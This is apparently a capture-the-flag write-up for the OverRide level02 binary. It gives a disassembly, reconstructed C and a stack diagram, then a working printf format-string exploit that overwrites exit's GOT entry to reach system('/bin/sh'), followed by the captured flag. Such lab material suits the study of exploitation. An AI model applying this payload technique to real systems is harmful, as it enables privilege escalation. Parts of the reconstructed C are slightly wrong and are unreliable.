### notes

```c
0x080484f4  main
```

### 0x00400814 : main() : disassembly

- notebook: (to convert `hex` to `dec` and assign variable names for better reading)

```c

{
    // 0x24...36
    // 0x29...41
    // 0x64 ... 100
    // 0x70... 112
    // 0xa0...160
    // 0x110...272
    // 0x114...276
    // 0x120...288

    // 0x20091e ... 2099486

    buff1 = rbp-112
    psswd = rbp-160
    buff3 = rbp-272
    psBytes = rbp-12
    file psswdFile = rbp-8
}
```

- **`<0> ➜ <+4> : prepare stack frame for n function with size 288`**
- **`<+11> ➜ <+17> : push the registers edi/rsi to the stack`**

```c
0x00400814 <+0>:	push   rbp
0x00400815 <+1>:	mov    rbp,rsp
0x00400818 <+4>:	sub    rsp,288
0x0040081f <+11>:	mov    DWORD PTR [rbp-276],edi
0x00400825 <+17>:	mov    QWORD PTR [rbp-288],rsi
```
- **`<+> ➜ <+> : ...`**
```c
0x0040082c <+24>:	lea    rdx,[buff1]
0x00400830 <+28>:	mov    eax,0
0x00400835 <+33>:	mov    ecx,12
0x0040083a <+38>:	mov    rdi,rdx
0x0040083d <+41>:	rep stos QWORD PTR es:[rdi],rax
0x00400840 <+44>:	mov    rdx,rdi
0x00400843 <+47>:	mov    DWORD PTR [rdx],eax
0x00400845 <+49>:	add    rdx,0x4
memset(buff1, 0, 48);
```
- **`<+> ➜ <+> : ...`**

```c
0x00400849 <+53>:	lea    rdx,[psswd]
0x00400850 <+60>:	mov    eax,0
0x00400855 <+65>:	mov    ecx,5
0x0040085a <+70>:	mov    rdi,rdx
0x0040085d <+73>:	rep stos QWORD PTR es:[rdi],rax
0x00400860 <+76>:	mov    rdx,rdi
0x00400863 <+79>:	mov    BYTE PTR [rdx],al
0x00400865 <+81>:	add    rdx,1
memset(psswd, 0, 20);
```
- **`<+> ➜ <+> : ...`**

```c
0x00400869 <+85>:	lea    rdx,[buff3]
0x00400870 <+92>:	mov    eax,0
0x00400875 <+97>:	mov    ecx,12
0x0040087a <+102>:	mov    rdi,rdx
0x0040087d <+105>:	rep stos QWORD PTR es:[rdi],rax
0x00400880 <+108>:	mov    rdx,rdi
0x00400883 <+111>:	mov    DWORD PTR [rdx],eax
0x00400885 <+113>:	add    rdx,4
memset(buff3, 0, 48);
```
- **`<+> ➜ <+> : ...`**

```c
0x00400889 <+117>:	mov    QWORD PTR [psswdFile],0
0x00400891 <+125>:	mov    DWORD PTR [psBytes],0
0x00400898 <+132>:	mov    edx,0x400bb0 // "r"
0x0040089d <+137>:	mov    eax,0x400bb2 // "/home/users/level03/.pass"
0x004008a2 <+142>:	mov    rsi,rdx
0x004008a5 <+145>:	mov    rdi,rax
0x004008a8 <+148>:	call   0x400700 <fopen@plt>
0x004008ad <+153>:	mov    QWORD PTR [psswdFile],rax
0x004008b1 <+157>:	cmp    QWORD PTR [psswdFile],0
0x004008b6 <+162>:	jne    0x4008e6 <main+210>

0x004008b8 <+164>:	mov    rax,QWORD PTR [rip+0x200991]        # 0x601250 <stderr@@GLIBC_2.2.5>
0x004008bf <+171>:	mov    rdx,rax
0x004008c2 <+174>:	mov    eax,0x400bd0 // "ERROR: failed to open password file\n"
0x004008c7 <+179>:	mov    rcx,rdx
0x004008ca <+182>:	mov    edx,36
0x004008cf <+187>:	mov    esi,1
0x004008d4 <+192>:	mov    rdi,rax
0x004008d7 <+195>:	call   0x400720 <fwrite@plt>
0x004008dc <+200>:	mov    edi,1
0x004008e1 <+205>:	call   0x400710 <exit@plt>
if (fopen("/home/users/level03/.pass", "r") == 0)
    fwrite("ERROR: failed to open password file\n", 1, 46, stderr);
    exit(10)
```
- **`<+> ➜ <+> : ...`**

```c
0x004008e6 <+210>:	lea    rax,[psswd]
0x004008ed <+217>:	mov    rdx,QWORD PTR [psswdFile]
0x004008f1 <+221>:	mov    rcx,rdx
0x004008f4 <+224>:	mov    edx,41
0x004008f9 <+229>:	mov    esi,1
0x004008fe <+234>:	mov    rdi,rax
0x00400901 <+237>:	call   0x400690 <fread@plt>
0x00400906 <+242>:	mov    DWORD PTR [psBytes],eax
psBytes = fread(psswd, 1, 41, psswdFile)
```
- **`<+> ➜ <+> : ...`**

```c
0x00400909 <+245>:	lea    rax,[psswd]
0x00400910 <+252>:	mov    esi,0x400bf5 // "\n"
0x00400915 <+257>:	mov    rdi,rax
0x00400918 <+260>:	call   0x4006d0 <strcspn@plt>
rax = strcspn(psswd, "\n")
0x0040091d <+265>:	mov    BYTE PTR [rbp+rax*1-160],0 // [rbp-160+rax] ==> [psswd+rax]
*(psswd + strcspn(psswd, "\n")) = \0
```
- **`<+> ➜ <+> : ...`**

```c
0x00400925 <+273>:	cmp    DWORD PTR [psBytes],41
0x00400929 <+277>:	je     0x40097d <main+361>
0x0040092b <+279>:	mov    rax,QWORD PTR [rip+2099486]        # 0x601250 <stderr@@GLIBC_2.2.5>
0x00400932 <+286>:	mov    rdx,rax
0x00400935 <+289>:	mov    eax,0x400bf8 // "ERROR: failed to read password file\n"
0x0040093a <+294>:	mov    rcx,rdx
0x0040093d <+297>:	mov    edx,36
0x00400942 <+302>:	mov    esi,1
0x00400947 <+307>:	mov    rdi,rax
0x0040094a <+310>:	call   0x400720 <fwrite@plt>
0x0040094f <+315>:	mov    rax,QWORD PTR [rip+0x2008fa]        # 0x601250 <stderr@@GLIBC_2.2.5>
0x00400956 <+322>:	mov    rdx,rax
0x00400959 <+325>:	mov    eax,0x400bf8 // "ERROR: failed to read password file\n"
0x0040095e <+330>:	mov    rcx,rdx
0x00400961 <+333>:	mov    edx,36
0x00400966 <+338>:	mov    esi,1
0x0040096b <+343>:	mov    rdi,rax
0x0040096e <+346>:	call   0x400720 <fwrite@plt>
0x00400973 <+351>:	mov    edi,1
0x00400978 <+356>:	call   0x400710 <exit@plt>
if (psBytes != 41) {
    fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
    fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
    exit(1);
}
```
- **`<+> ➜ <+> : ...`**

```c
0x0040097d <+361>:	mov    rax,QWORD PTR [psswdFile]
0x00400981 <+365>:	mov    rdi,rax
0x00400984 <+368>:	call   0x4006a0 <fclose@plt>
fclose(psswdFile);
```
- **`<+> ➜ <+> : ...`**

```c
0x00400989 <+373>:	mov    edi,0x400c20 // "===== [ Secure Access System v1.0 ] ====="
0x0040098e <+378>:	call   0x400680 <puts@plt>
0x00400993 <+383>:	mov    edi,0x400c50 // "/", '*' <repeats 39 times>, "\\"
0x00400998 <+388>:	call   0x400680 <puts@plt>
0x0040099d <+393>:	mov    edi,0x400c80 // "| You must login to access this system. |"
0x004009a2 <+398>:	call   0x400680 <puts@plt>
0x004009a7 <+403>:	mov    edi,0x400cb0 // "\\", '*' <repeats 38 times>, "/"
0x004009ac <+408>:	call   0x400680 <puts@plt>
0x004009b1 <+413>:	mov    eax,0x400cd9 // "--[ Username: "
0x004009b6 <+418>:	mov    rdi,rax
0x004009b9 <+421>:	mov    eax,0
0x004009be <+426>:	call   0x4006c0 <printf@plt>

puts("===== [ Secure Access System v1.0 ] =====");
puts("/***************************************\\");
puts("| You must login to access this system. |");
puts("\\**************************************/");

printf("--[ Username:");
```
- **`<+> ➜ <+> : ...`**

```c
0x004009c3 <+431>:	mov    rax,QWORD PTR [rip+0x20087e]        # 0x601248 <stdin@@GLIBC_2.2.5>
0x004009ca <+438>:	mov    rdx,rax
0x004009cd <+441>:	lea    rax,[buff1]
0x004009d1 <+445>:	mov    esi,100
0x004009d6 <+450>:	mov    rdi,rax
0x004009d9 <+453>:	call   0x4006f0 <fgets@plt>
fgets(buff1, 100, stdin);
```
- **`<+> ➜ <+> : ...`**

```c
0x004009de <+458>:	lea    rax,[buff1]
0x004009e2 <+462>:	mov    esi,0x400bf5 // \n
0x004009e7 <+467>:	mov    rdi,rax
0x004009ea <+470>:	call   0x4006d0 <strcspn@plt>
rax = strcspn(buff1, "\n");
```
- **`<+> ➜ <+> : ...`**

```c
0x004009ef <+475>:	mov    BYTE PTR [rbp+rax*1-112],0
*(buff1+strcspn(buff1, "\n")) = 0;
```
- **`<+> ➜ <+> : ...`**

```c
0x004009f4 <+480>:	mov    eax,0x400ce8 // "--[ Password: "
0x004009f9 <+485>:	mov    rdi,rax
0x004009fc <+488>:	mov    eax,0x0
0x00400a01 <+493>:	call   0x4006c0 <printf@plt>
printf("--[ Password: ");
```
- **`<+> ➜ <+> : ...`**

```c
0x00400a06 <+498>:	mov    rax,QWORD PTR [rip+0x20083b]  # 0x601248 <stdin@@GLIBC_2.2.5>
0x00400a0d <+505>:	mov    rdx,rax
0x00400a10 <+508>:	lea    rax,[buff3]
0x00400a17 <+515>:	mov    esi,100
0x00400a1c <+520>:	mov    rdi,rax
0x00400a1f <+523>:	call   0x4006f0 <fgets@plt>
fgets(buff3, 100, stdin);
```
- **`<+> ➜ <+> : ...`**

```c
0x00400a24 <+528>:	lea    rax,[buff3]
0x00400a2b <+535>:	mov    esi,0x400bf5 // \n
0x00400a30 <+540>:	mov    rdi,rax
0x00400a33 <+543>:	call   0x4006d0 <strcspn@plt>
0x00400a38 <+548>:	mov    BYTE PTR [rbp+rax*1-272],0 // ~ [buff3+rax]
0x00400a40 <+556>:	mov    edi,0x400cf8 // '*' <repeats 41 times>
0x00400a45 <+561>:	call   0x400680 <puts@plt>
rax = strcspn(buff3, , "\n");
*(buff3+strcspn(buff3, , "\n")) = 0
puts("*****************************************");
```
- **`<+> ➜ <+> : ...`**

```c
0x00400a4a <+566>:	lea    rcx,[buff3]
0x00400a51 <+573>:	lea    rax,[psswd]
0x00400a58 <+580>:	mov    edx,41
0x00400a5d <+585>:	mov    rsi,rcx
0x00400a60 <+588>:	mov    rdi,rax
0x00400a63 <+591>:	call   0x400670 <strncmp@plt>
eax = strncmp(psswd, buff3, 41);
```
- **`<+> ➜ <+> : ...`**

```c
0x00400a68 <+596>:	test   eax,eax
0x00400a6a <+598>:	jne    0x400a96 <main+642>
0x00400a6c <+600>:	mov    eax,0x400d22 // "Greetings, %s!\n"
0x00400a71 <+605>:	lea    rdx,[buff1]
0x00400a75 <+609>:	mov    rsi,rdx
0x00400a78 <+612>:	mov    rdi,rax
0x00400a7b <+615>:	mov    eax,0
0x00400a80 <+620>:	call   0x4006c0 <printf@plt>
0x00400a85 <+625>:	mov    edi,0x400d32 // ""/bin/sh"
0x00400a8a <+630>:	call   0x4006b0 <system@plt>
0x00400a8f <+635>:	mov    eax,0
0x00400a94 <+640>:	leave
0x00400a95 <+641>:	ret

if (strncmp(psswd, buff3, 41)) {
    printf("Greetings, %s!\n", buff1)
    system("/bin/sh");
    return(0);
}
```
- **`<+> ➜ <+> : ...`**

```c
0x00400a96 <+642>:	lea    rax,[buff1]
0x00400a9a <+646>:	mov    rdi,rax
0x00400a9d <+649>:	mov    eax,0
0x00400aa2 <+654>:	call   0x4006c0 <printf@plt>
0x00400aa7 <+659>:	mov    edi,0x400d3a
0x00400aac <+664>:	call   0x400680 <puts@plt>
0x00400ab1 <+669>:	mov    edi,1
0x00400ab6 <+674>:	call   0x400710 <exit@plt>
printf(buff1);
puts(" does not have access!");
exit(1);
```

### Code Prediction

```c
int main(int argc(ebp+0x8), char **argv(ebp+12)) {

    var buff1
    var *psswd
    var *buff3
    var psBytes
    File *psswdFile

    memset(buff1, 0, 48);
    memset(psswd, 0, 20);
    memset(buff3, 0, 48);

    if (fopen("/home/users/level03/.pass", "r") == 0){
        fwrite("ERROR: failed to open password file\n", 1, 46, stderr);
        exit(10)

    }

    psBytes = fread(psswd, 1, 41, psswdFile); // READ PASSWORD FILE INTO "psswd" buffer
    *(psswd + strcspn(psswd, "\n")) = \0; // put \0 at the end of psswd string in the place of \n

    if (psBytes != 41) {
        fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
        fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
        exit(1);
    }

    fclose(psswdFile);

    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
    printf("--[ Username:");

    fgets(buff1, 100, stdin); // USER INPUT 1

    *(buff1 + strcspn(buff1, "\n")) = 0

    printf("--[ Password: ");
    fgets(buff3, 100, stdin); // USER INPUT 2

    *(buff3 + strcspn(buff3, , "\n")) = 0
    puts("*****************************************");

    if (strncmp(psswd, buff3, 41)) {
        printf("Greetings, %s!\n", buff1);
        system("/bin/sh");
        return(0);
    }

    printf(buff1);
    puts(" does not have access!");
    exit(1);

}
```

### Stack Illustration

```c
+-------------------+
[      **argv       ]
+-------------------+ +12
[        argc       ]
+-------------------+ +8
[ret addr (OLD_EIP) ]
+-------------------+ +4
[      OLD_EBP      ]
+-------------------+ <--- RBP
[                   ]
+-------------------+ RBP-4
[                   ]
+-------------------+ RBP-8 -- ile psswdFile
[      file*        ] <---fread(buff2, 1, 41, psswdFile)
+-------------------+ rbp - 12
[                   ]
[                   ]
+-------------------+ RBP-112 -- username (48)<----+
[                   ]                              | (48 bytes)
[                   ]                              | 
+-------------------+ RBP-160 -- buff2 (20)   <----+
[                   ]                              | (111 bytes)
[                   ]                              |
+-------------------+ RBP-272 -- password (20) <---+
[       edi         ]
+-------------------+ RBP-276
[       rsi         ]
+-------------------+ RBP-288 (RSP)
```

### Process of the Exploit
- we use the printf format exploit like rainfall in leve4 (**%n**) to override the address of the got exit with the addressof the instruction where system + bin/sh is called 

- disass main:
    ```c
    *
    *
    *
    0x0000000000400a7b <+615>:	mov    eax,0x0
    0x0000000000400a80 <+620>:	call   0x4006c0 <printf@plt>
    0x0000000000400a85 <+625>:	mov    edi,0x400d32 <---------- the instruction to call system + arg
    0x0000000000400a8a <+630>:	call   0x4006b0 <system@plt>
    0x0000000000400a8f <+635>:	mov    eax,0x0
    0x0000000000400a94 <+640>:	leave  
    0x0000000000400a95 <+641>:	ret
    *
    *
    *
    ```
- disass exit :
    ```c
    Dump of assembler code for function exit@plt:
   0x0000000000400710 <+0>:	jmp    QWORD PTR [rip+0x200b12]  # 0x601228 <exit@got.plt> <----- GOT
   0x0000000000400716 <+6>:	push   0xa
   0x000000000040071b <+11>:	jmp    0x400660
    End of assembler dump.
    (gdb)
    ```
- address to override : `0x601228` (hex) = `\x28\x12\x60` (little endian)
- value to override with : `0x0000000000400a85` (hex) = `0x400a85` (hex) = `4196997` (decimal)

---

### Solution :

```shell
level02@OverRide:~$ (python -c 'print "%4196997d" + "%8$n"' ; python -c 'print "\x28\x12\x60"'; cat) | ./level02
                                               [...]
                                               -7216 does not have access!
pwd
/home/users/level02
whoami
level03
cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

|**`flag : Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`**
---

### Ressources :

**_[doc1](link)_**
**_[doc2](link)_**
**_[doc3](link)_**
...
**_[docX](link)_**
